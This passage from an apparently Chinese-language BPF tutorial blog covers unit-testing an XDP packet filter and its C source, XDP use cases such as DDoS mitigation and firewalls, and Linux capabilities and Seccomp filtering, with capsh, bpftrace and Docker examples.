unittest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XDPExampleTestCase</span><span class="params">(unittest.TestCase)</span>:</span></span><br><span class="line">    SKB_OUT_SIZE = <span class="number">1514</span>  <span class="comment"># mtu 1500 + 14 ethernet size</span></span><br><span class="line">    bpf_function = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_xdp_test_run</span><span class="params">(self, given_packet, expected_packet, expected_return)</span>:</span></span><br><span class="line">        size = len(given_packet)</span><br><span class="line"></span><br><span class="line">        given_packet = ctypes.create_string_buffer(raw(given_packet), size)</span><br><span class="line">        packet_output = ctypes.create_string_buffer(self.SKB_OUT_SIZE)</span><br><span class="line"></span><br><span class="line">        packet_output_size = ctypes.c_uint32()</span><br><span class="line">        test_retval = ctypes.c_uint32()</span><br><span class="line">        duration = ctypes.c_uint32()</span><br><span class="line">        repeat = <span class="number">1</span></span><br><span class="line">        ret = libbcc.lib.bpf_prog_test_run(self.bpf_function.fd,</span><br><span class="line">                                           repeat,</span><br><span class="line">                                           ctypes.byref(given_packet),</span><br><span class="line">                                           size,</span><br><span class="line">                                           ctypes.byref(packet_output),</span><br><span class="line">                                           ctypes.byref(packet_output_size),</span><br><span class="line">                                           ctypes.byref(test_retval),</span><br><span class="line">                                           ctypes.byref(duration))</span><br><span class="line">        self.assertEqual(ret, <span class="number">0</span>)</span><br><span class="line">        self.assertEqual(test_retval.value, expected_return)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> expected_packet:</span><br><span class="line">            self.assertEqual(</span><br><span class="line">                packet_output[:packet_output_size.value], raw(expected_packet))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setUp</span><span class="params">(self)</span>:</span></span><br><span class="line">        bpf_prog = BPF(src_file=<span class="string">b"program.c"</span>)</span><br><span class="line">        self.bpf_function = bpf_prog.load_func(<span class="string">b"myprogram"</span>, BPF.XDP)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_drop_tcp</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / TCP()</span><br><span class="line">        self._xdp_test_run(given_packet, <span class="literal">None</span>, BPF.XDP_DROP)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_pass_udp</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / UDP()</span><br><span class="line">        expected_packet = Ether() / IP() / UDP()</span><br><span class="line">        self._xdp_test_run(given_packet, expected_packet, BPF.XDP_PASS)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">test_transform_dst</span><span class="params">(self)</span>:</span></span><br><span class="line">        given_packet = Ether() / IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">        expected_packet = Ether(dst=<span class="string">'08:00:27:dd:38:2a'</span>) / \</span><br><span class="line">            IP() / TCP(dport=<span class="number">9090</span>)</span><br><span class="line">        self._xdp_test_run(given_packet, expected_packet, BPF.XDP_TX)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    unittest.main()</span><br></pre></td></tr></table></figure><p>我们已经为XDP程序编写了测试！现在我们已经将测试作为我们想要的特定示例，我们可以通过创建一个名为<code>program.c</code>的文件来编写实现它的XDP程序。</p><p>程序很简单。它只包含<code>myprogram</code> XDP函数和我们刚刚测试的逻辑。与往常一样，我们需要做的第一件事是包含所需的标题。有一个BPF程序将处理通过以太网传输的TCP/IP：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"kmyprogram"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br></pre></td></tr></table></figure><p>同样，与本章中的其他程序一样，我们需要检查数据包三层的偏移量和填充变量：<code>ethhdr、iphdr和 tcphdr</code>，分别用于以太网、IPv4和TCP：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">th</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>一旦有了值，我们就可以实现相应逻辑。</p><p>第一件要做的事是检查协议是否为TCP <code>ip-&gt;protocol == IPPROTO_TCP</code>。 如果是，我们总是做一个<code>XDP_DROP</code>； 否则，对其他所有内容执行<code>XDP_PASS</code>。</p><p>在检查TCP协议时，我们做另一个控制来检查目标端口是否为9090，<code>th-&gt;dest == htons(9090)</code>; 如果是，我们在以太网层改变目的MAC地址，返回<code>XDP_TX</code>，通过同一个网卡反弹数据包：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    th = (struct tcphdr *)(ip + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">void</span> *)(th + <span class="number">1</span>) &gt; data_end) &#123;</span><br><span class="line">      <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (th-&gt;dest == htons(<span class="number">9090</span>)) &#123;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">0</span>] = <span class="number">0x08</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">2</span>] = <span class="number">0x27</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">4</span>] = <span class="number">0x38</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">5</span>] = <span class="number">0x2a</span>;</span><br><span class="line">      <span class="keyword">return</span> XDP_TX;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>program.c</code>完整程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KBUILD_MODNAME <span class="meta-string">"kmyprogram"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/bpf.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/if_ether.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tcp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myprogram</span><span class="params">(struct xdp_md *ctx)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> ipsize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">void</span> *data = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data;</span><br><span class="line">  <span class="keyword">void</span> *data_end = (<span class="keyword">void</span> *)(<span class="keyword">long</span>)ctx-&gt;data_end;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">ethhdr</span> *<span class="title">eth</span> = <span class="title">data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">iphdr</span> *<span class="title">ip</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcphdr</span> *<span class="title">th</span>;</span></span><br><span class="line"></span><br><span class="line">  ipsize = <span class="keyword">sizeof</span>(*eth);</span><br><span class="line">  ip = data + ipsize;</span><br><span class="line">  ipsize += <span class="keyword">sizeof</span>(struct iphdr);</span><br><span class="line">  <span class="keyword">if</span> (data + ipsize &gt; data_end) &#123;</span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ip-&gt;protocol == IPPROTO_TCP) &#123;</span><br><span class="line">    th = (struct tcphdr *)(ip + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">void</span> *)(th + <span class="number">1</span>) &gt; data_end) &#123;</span><br><span class="line">      <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (th-&gt;dest == htons(<span class="number">9090</span>)) &#123;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">0</span>] = <span class="number">0x08</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">1</span>] = <span class="number">0x00</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">2</span>] = <span class="number">0x27</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">3</span>] = <span class="number">0xdd</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">4</span>] = <span class="number">0x38</span>;</span><br><span class="line">      eth-&gt;h_dest[<span class="number">5</span>] = <span class="number">0x2a</span>;</span><br><span class="line">      <span class="keyword">return</span> XDP_TX;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> XDP_DROP;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> XDP_PASS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在可以运行我们的测试程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos prog-test-run]# python3 test_xdp.py</span><br><span class="line">...</span><br><span class="line">    --------------------------------</span><br><span class="line">    Ran 3 tests in 4.676s</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><h3 id="XDP用例"><a href="#XDP用例" class="headerlink" title="XDP用例"></a>XDP用例</h3><h4 id="监控"><a href="#监控" class="headerlink" title="监控"></a>监控</h4><p>现在，大多数网络监控系统要么通过编写内核模块来实现，要么通过从用户空间访问<code>proc</code>文件来实现。 编写、分发和编译内核模块并不是每个人的任务。 它们也不容易维护和调试。 然而，替代方案可能更糟。 要获得相同类型的信息，例如一张卡在一秒钟内收到多少个数据包，您需要打开并分割一个文件，在本例中是 <code>/sys/class/net/eth0/statistics/rx_packets</code>。 这似乎是一个好主意，但它需要大量的计算才能获得一些简单的信息，因为在某些情况下使用开放系统调用并不便宜。</p><p>因此我们需要一个解决方案，能够实现与内核模块类似的功能，而不会损失性能。XDP是完美的，因为我们可以使用XDP程序发送我们想要在映射中提取的数据。然后映射被加载器使用，加载器可以将指标存储到存储后端并对其应用算法或将结果绘制在图中。</p><h4 id="缓解DDoS"><a href="#缓解DDoS" class="headerlink" title="缓解DDoS"></a>缓解DDoS</h4><p>能够在NIC级别查看数据包可确保在第一阶段拦截任何可能的数据包，此时系统尚未花费足够的计算能力来了解数据包是否对系统有用。在典型的场景中，<code>bpf map</code>可以指示XDP程序从某个源<code>XDP_DROP</code>数据包。在分析通过另一个映射接收到的数据包之后，可以在用户空间中生成该数据包列表。一旦流入XDP程序的数据包与列表中的元素匹配，就会发生缓解。 数据包被丢弃，内核甚至不需要花费一个CPU周期来处理它。这导致攻击者的目标难以实现，因为在这种情况下，它无法浪费任何昂贵的计算资源。</p><h4 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h4><p>XDP程序的一个有趣用例是负载平衡。 但是，XDP只能在数据包到达的同一个NIC上重新传输数据包。这意味着XDP不是实现经典负载均衡器的最佳选择，该负载均衡器位于所有服务器之前并将流量转发给它们。但是，这并不意味着XDP不适合这个用例。 如果我们将负载平衡从外部服务器转移到为应用程序提供服务的同一台机器上，则可以看到NIC是如何完成这项工作。</p><p>通过这种方式，我们可以创建一个分布式负载均衡器，其中每台托管应用程序的机器都有助于将流量分散到适当的服务器。</p><h4 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h4><p>当人们想到Linux上的防火墙时，通常会想到<code>iptables</code>或网络过滤器。 使用XDP可以直接在NIC或其驱动程序中以完全可编程的方式获得相同的功能。通常，防火墙是位于网络堆栈顶部或节点之间的昂贵机器，用于控制其通信。然而，当使用XDP时，因为XDP程序非常便宜和快速，我们可以将防火墙逻辑直接实现到节点的NIC中，而不是使用一组专用机器。一个常见的用例是有一个XDP加载器来控制一个映射，其中包含一组通过远程过程调用API更改的规则。 然后，映射中的一组规则会动态地传递给加载到每台特定机器中的XDP程序，以控制它可以接收什么、从谁以及在什么情况下接收。</p><p>这种替代方案不仅降低了防火墙成本； 它还允许每个节点部署自己的防火墙级别，而无需依赖用户空间软件或内核来执行此操作。当使用<code>offloaded</code>的XDP作为操作模式进行部署时会有更大优势，因为处理甚至不需要主节点CPU完成。</p><h3 id="结论-2"><a href="#结论-2" class="headerlink" title="结论"></a>结论</h3><p>从现在开始，XDP将帮助你以一种完全不同的方式思考网络流。处理网络数据包时不得不依赖<code>iptables</code>或其他用户空间工具等工具令人沮丧。XDP则很有趣，因为它具有直接的数据包处理能力，因此速度更快，而且你可以编写自己的逻辑来处理网络数据包。因为所有这些代码都可以与映射一起使用并与其他BPF程序交互。</p><h2 id="第八章节"><a href="#第八章节" class="headerlink" title="第八章节"></a>第八章节</h2><h3 id="Linux内核Security、Capabilities和Seccomp"><a href="#Linux内核Security、Capabilities和Seccomp" class="headerlink" title="Linux内核Security、Capabilities和Seccomp"></a>Linux内核Security、Capabilities和Seccomp</h3><p>BPF是一种在不影响稳定性、安全性和速度的情况下扩展内核的强大方法。出于这个原因，内核开发人员认为，通过实现由BPF 程序（也称为 Seccomp BPF）支持的<code>Seccomp</code>过滤器，利用其多功能性来改善 <code>Seccomp</code>中的进程隔离会是一件好事。在本章中，我们将研究<code>Seccomp</code>是什么以及如何使用它。 然后你会学习如何使用BPF程序编写<code>Seccomp</code>过滤器。 最后将探索内核为Linux安全模块提供的内置BPF挂钩。</p><p>Linux安全模块 (LSM) 是一个框架，它提供了一组功能，可用于以标准化方式实现不同的安全模型。LSM可以直接在内核源代码树中使用，例如<code>Apparmor、SELinux和Tomoyo</code></p><h3 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h3><p>Linux功能的处理是你需要为非特权进程提供执行特定任务的权限，但你不想将<code>suid</code>权限授予二进制文件或以其他方式使进程具有特权，因此只需通过减少攻击面赋予流程完成特定任务的特定能力。例如，如果你的应用程序需要打开一个特权端口，比如 80，而不是以root身份启动进程，你可以给它<code>CAP_NET_BIND_SERVICE</code>能力。</p><p>考虑如下<code>main.go</code>程序</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span>(</span><br><span class="line"><span class="string">"net/http"</span></span><br><span class="line">  <span class="string">"log"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  log.Fatalf(<span class="string">"%v"</span>, http.ListenAndServe(<span class="string">":80"</span>, <span class="literal">nil</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该程序在端口80（一个特权端口）上为HTTPserver提供服务。</p><p>我们通常会做的是在使用以下代码编译后直接运行该程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[elssm@VM-16-14-centos ~]$ go build -o capabilities main.go</span><br><span class="line">[elssm@VM-16-14-centos ~]$ ./capabilities</span><br><span class="line">2022/06/03 17:44:46 listen tcp :80: bind: permission denied</span><br></pre></td></tr></table></figure><p>但是，由于我们没有授予root权限，因此绑定端口时该代码会输出错误：</p><p>在这种情况下，如上所述，我们可以通过允许<code>cap_net_bind_service</code>功能以及程序已经拥有的所有其他功能来允许特权端口的绑定，而不是给予完全的root权限。 为此，我们可以使用<code>capsh</code>包装我们的程序运行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# capsh --caps='cap_net_bind_service+eip cap_setpcap,cap_setuid,cap_setgid+ep' --keep=1 --user="nobody" --addamb=cap_net_bind_service -- -c "./capabilities"</span><br></pre></td></tr></table></figure><p>capsh：使用capsh作为装饰器</p><p>—caps=’cap_net_bind_service+eip cap_setpcap,cap_setuid,cap_setgid+ep’：因为我们需要更改用户（我们不想以root身份运行），所以我们需要指定<code>cap_net_bind_service</code>以及实际将用户ID从root 更改为nobody的能力，即<code>cap_setuid</code>和<code>cap_setgid</code>：</p><p>—keep=1：当从root切换完成时，我们希望保留设置的功能</p><p>—user=’nobody’：运行我们程序的最终用户将是任何人</p><p>—addamb=cap_net_bind_service：我们设置了环境功能，因为这些功能在从root切换后会被清除。</p><p>— -c “./capabilities”：一切就绪，运行程序</p><p>此时你可能会问在<code>--caps</code>选项中的功能之后的<code>+eip</code>是什么：</p><ul><li>需要激活该功能(p)</li><li>该能力是可用的(e)</li><li>该能力可以由子进程继承(i)</li></ul><p>因为我们要使用我们的<code>cap_net_bind_service</code>，所以需要将它设为e； 然后在我们的命令中启动了一个 shell。启动了<code>capabilities</code>二进制文件，我们需要设置为i。 最后，我们希望使用p激活该功能(不是因为我们更改了 UID)。 最终成为<code>cap_net_bind_service+eip</code>。</p><p>您可以使用<code>ss</code>进行验证。 我们将剪切输出以使其适合此页面，但它会显示绑定端口和用户ID，而不是 0，在本例中为 65534：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos ~]# ss -tulpn -e -H | cut -d' ' -f17-</span><br><span class="line">*:80        *:* users:(("capabilities",pid=253996,fd=3)) uid:65534 ino:1512751 sk:6 cgroup:unreachable:1 v6only:0 &lt;-&gt;</span><br></pre></td></tr></table></figure><p>我们在本例中使用了<code>capsh</code>，你也可以使用<code>libcap</code>编写包装器；有关详细信息，请参阅<code>man 3 libcap</code></p><p>为了更好地理解我们程序使用的功能，我们可以使用BCC提供的功能工具，该工具在内核函数<code>cap_capable</code> 上设置<code>kprobe</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# /usr/share/bcc/tools/capable</span><br><span class="line">TIME      UID    PID    COMM             CAP  NAME                 AUDIT </span><br><span class="line">18:29:12  0      258056 barad_agent      1    CAP_DAC_OVERRIDE     1     </span><br><span class="line">18:29:12  0      258056 barad_agent      1    CAP_DAC_OVERRIDE     1     </span><br><span class="line">18:29:20  0      1210   YDService        19   CAP_SYS_PTRACE       1            </span><br><span class="line">18:29:22  0      258074 barad_agent      1    CAP_DAC_OVERRIDE     1   </span><br><span class="line">18:29:39  0      258733 capabilities     10   CAP_NET_BIND_SERVICE 1</span><br></pre></td></tr></table></figure><p>我们可以使用<code>bpftrace</code>和<code>cap_capable</code>内核函数上的单线<code>kprobe</code>来完成相同的操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt8]# bpftrace -e \ 'kprobe:cap_capable &#123;time("%H:%M:%S  "); printf("%-6d %-6d %-16s %-4d %d\n", uid, pid, comm, arg2, arg3); &#125;' | grep -i capabilities</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br><span class="line">18:35:30  0      259014 capabilities     21   2</span><br></pre></td></tr></table></figure><p><code>Capabilities</code>通常用于容器运行时，如<code>runC</code>或<code>Docker</code>，以使容器无特权并仅允许运行大多数应用程序所需的功能。 当应用程序需要特定功能时，在<code>Docker</code>中可以使用<code>--cap-add</code>来完成：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --rm --cap-add=NET_ADMIN ubuntu ip link add dummy0 type dummy</span><br></pre></td></tr></table></figure><p>此命令将为该容器提供<code>CAP_NET_ADMIN</code>功能，允许它设置网络链接以添加<code>dummy0</code>接口。</p><p>下一节将展示如何实现过滤等功能，但要使用另一种技术，以编程方式实现自己的过滤器。</p><h3 id="Seccomp"><a href="#Seccomp" class="headerlink" title="Seccomp"></a>Seccomp</h3><p><code>Seccomp</code>代表安全计算，它是在Linux内核中实现的安全层，允许开发人员过滤特定的系统调用。尽管<code>Seccomp</code>可以与<code>capabilities</code>相媲美，但它控制特定系统调用的能力相比于<code>capabilities</code>更加灵活。</p><p><code>Seccomp</code>和<code>capabilities</code>不相互排斥； 它们经常一起使用 例如，你希望为进程提供<code>CAP_NET_ADMIN</code>功能，但不允许它通过阻止<code>accept</code>和<code>accept4</code>系统调用来接受套接字上的连接。</p><p><code>Seccomp</code>过滤器的方式基于<code>SECCOMP_MODE_FILTER</code>模式的BPF过滤器，并且系统调用过滤的完成方式与对数据包的过滤方式相同。</p><p><code>Seccomp</code>过滤器通过<code>PR_SET_SECCOMP</code>操作使用<code>prctl</code>加载；这些过滤器以BP 程序的形式表示，该程序在使用<code>seccomp_data</code>结构表示的每个<code>Seccomp</code>数据包上执行。该结构包含参考架构、系统调用时的CPU指令指针以及最多六个以<code>uint64</code>表示的系统调用参数。</p><p>以下是<code>seccomp_data</code>结构在<code>linux/seccomp.h</code>内核源码中的样子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seccomp_data</span> &#123;</span> </span><br><span class="line">  <span class="keyword">int</span> nr;</span><br><span class="line">  __u32 arch;</span><br><span class="line">  __u64 instruction_pointer;</span><br><span class="line">  __u64 args[<span class="number">6</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以基于系统调用、基于其参数或基于它们的组合进行过滤。</p><p>在接收到每个<code>Seccomp</code>数据包后，过滤器有责任进行处理以做出最终决定，告诉内核下一步该做什么。最终决定通过它可以给出的返回值（状态代码）之一表示，如下所述：</p><p>SECCOMP_RET_KILL_PROCESS：它会在过滤系统调用后立即终止整个进程，因此不会执行</p><p>SECCOMP_RET_KILL_THREAD：它会在过滤系统调用后立即终止当前线程，因此不会执行</p><p>SECCOMP_RET_KILL：这是SECCOMP_RET_KILL_THREAD的别名，以保持兼容性</p><p>SECCOMP_RET_TRAP：系统调用被禁止，SIGSYS信号被发送到调用它的任务</p><p>SECCOMP_RET_ERRNO：系统调用未执行，过滤器返回值的SECCOMP_RET_DATA部分作为<code>errno</code>值传递给用户空间。根据错误的原因，返回不同的<code>errno</code> </p><p>SECCOMP_RET_TRACE：这用于通知使用PTRACE_O_TRACESECCOMP的<code>ptrace</code>跟踪器在调用系统调用观察和控制系统调用执行时进行拦截。如果没有附加跟踪器，则返回错误，将<code>errno</code>设置为<code>-ENOSYS</code>，并且不执行系统调用</p><p>SECCOMP_RET_LOG：系统调用被允许并被记录</p><p>SECCOMP_RET_ALLOW：系统调用被允许</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace是一个系统调用，用于在进程上实现跟踪机制，称为tracee，其效果是能够观察和控制进程的执行。跟踪器程序可以有效地影响执行并更改被跟踪者的内存寄存器。在Seccomp的上下文中，ptrace在由SECCOMP_RET_TRACE状态码触发时使用；因此，跟踪器可以阻止系统调用执行并实现自己的逻辑。</span><br></pre></td></tr></table></figure><h4 id="Seccomp错误"><a href="#Seccomp错误" class="headerlink" title="Seccomp错误"></a>Seccomp错误</h4><p>有时，在使用<code>Seccomp</code>时会遇到由SECCOMP_RET_ERRNO类型的返回值给出的不同错误。为了通知发生错误，<code>seccomp</code>系统调用将返回-1而不是0。</p><p>可能的错误如下：</p><p>EACCESS：不允许调用者进行系统调用，这通常是因为它没有<code>CAP_SYS_ADMIN</code>权限或没有使用<code>prctl</code>设置 